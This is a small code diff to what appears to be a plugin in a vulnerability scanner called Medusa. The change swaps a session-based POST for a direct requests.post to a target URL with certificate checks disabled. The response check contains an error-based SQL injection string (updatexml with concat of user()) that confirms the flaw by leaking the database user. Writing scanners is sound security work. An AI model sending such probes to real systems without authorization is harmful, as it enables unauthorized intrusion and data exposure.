@@ -51,8 +51,7 @@ def medusa(Url,RandomAgent,Token,proxies=None):
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
         }
 
-        s = requests.session()
-        resp = s.post(payload_url, headers=headers, timeout=6, data=data, proxies=proxies, verify=False)
+        resp = requests.post(payload_url, headers=headers, timeout=6, data=data, proxies=proxies, verify=False)
         con = resp.text
         code = resp.status_code
         if code== 200 and con.find('错误信息') != -1 and con.find('''(`content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) )''')!=-1 and con.find('执行SQL发生错误') != -1:
